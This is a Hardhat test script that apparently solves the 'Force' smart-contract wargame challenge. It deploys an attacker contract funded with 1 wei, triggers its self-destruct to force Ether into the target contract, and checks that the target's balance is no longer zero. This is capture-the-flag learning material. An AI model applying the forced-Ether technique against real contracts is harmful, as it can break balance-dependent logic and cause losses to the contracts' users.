const { assert } = require("chai")
const { ethers, waffle } = require("hardhat")
require("dotenv").config()

const provider = waffle.provider
let player, challenge, challengeAddress, tx, attacker

beforeEach(async () => {
    accounts = await ethers.getSigners()
    player = accounts[0]

    challengeAddress = process.env.CHALLENGEADDRESS7 //address of my instance contract
    const challengeFactory = await ethers.getContractFactory(`Force`)
    challenge = await challengeFactory.attach(challengeAddress)

    const attackerFactory = await ethers.getContractFactory(`ForceAttacker`)
    /* We have to deploy ForceAttack contract with some Ether.
    This value will be send to attacked contract (Force).*/
    attacker = await attackerFactory.deploy(challenge.address, {
        value: ethers.utils.parseUnits("1", `wei`),
    })
})

it("Solves the challenge 'Force'", async () => {
    /*By selfdestroing of contract we force sending Ether to attacked contract */
    tx = await attacker.attack()
    await tx.wait(1)

    let balance = await provider.getBalance(challenge.address)
    assert(parseInt(balance.toString()) != 0, "Balance of contract is equal zero")
})
